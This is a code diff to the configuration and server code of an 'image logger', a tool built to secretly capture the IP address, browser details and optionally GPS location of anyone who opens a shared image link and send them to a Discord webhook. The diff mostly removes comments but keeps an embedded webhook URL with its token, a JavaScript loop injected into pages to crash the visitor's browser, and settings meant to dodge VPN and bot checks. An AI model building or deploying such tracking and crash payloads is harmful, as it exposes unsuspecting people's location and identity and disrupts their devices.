@@ -1,45 +1,34 @@
 config = {
-    # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1379554736260513853/mULMH0NoNCxXm7jJvykBYtxOWP0xIhSkl3jf4RzQ_mqe1hJi1UJE1_LQAa502pIzvvCq",
-    "image": "https://pbs.twimg.com/profile_images/1284155869060571136/UpanAYid_400x400.jpg", # You can also have a custom image by using a URL argument
-                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
-    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
+ "webhook": "https://discord.com/api/webhooks/1379554736260513853/mULMH0NoNCxXm7jJvykBYtxOWP0xIhSkl3jf4RzQ_mqe1hJi1UJE1_LQAa502pIzvvCq",
+    "image": "https://pbs.twimg.com/profile_images/1284155869060571136/UpanAYid_400x400.jpg",
 
-    # CUSTOMIZATION #
-    "username": "Image Logger", # Set this to the name you want the webhook to have
-    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
+    "imageArgument": True,
 
-    # OPTIONS #
-    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
+  
+    "username": "Image Logger",
+    "color": 0x00FFFF,
+
     
-    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
+    "crashBrowser": False,
+    
+    "accurateLocation": False,
 
-    "message": { # Show a custom message when the user opens the image
-        "doMessage": False, # Enable the custom message?
-        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
-        "richMessage": True, # Enable rich text? (See README for more info)
+    "message": { 
+        "doMessage": False, 
+        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", 
+        "richMessage": True, 
     },
 
-    "vpnCheck": 1, # Prevents VPNs from triggering the alert
-                # 0 = No Anti-VPN
-                # 1 = Don't ping when a VPN is suspected
-                # 2 = Don't send an alert when a VPN is suspected
+    "vpnCheck": 1, 
+    "linkAlerts": True,
+    "buggedImage": True,
 
-    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
-    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)
+    "antiBot": 1,
 
-    "antiBot": 1, # Prevents bots from triggering the alert
-                # 0 = No Anti-Bot
-                # 1 = Don't ping when it's possibly a bot
-                # 2 = Don't ping when it's 100% a bot
-                # 3 = Don't send an alert when it's possibly a bot
-                # 4 = Don't send an alert when it's 100% a bot
-    
-
-    # REDIRECTION #
+   
     "redirect": {
-        "redirect": False, # Redirect to a webpage?
-        "page": "https://your-link.here" # Link to the webpage to redirect to 
+        "redirect": False,
+        "page": "https://your-link.here"
     },
 
 }
@@ -111,7 +100,7 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
           "inline": False
         }
     ],
-}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
+}) if config["linkAlerts"] else None
         return
 
     ping = "@everyone"
@@ -268,7 +257,7 @@ height: 100vh;
                     data = message.encode()
                 
                 if config["crashBrowser"]:
-                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher
+                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' 
 
                 if config["redirect"]["redirect"]:
                     data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
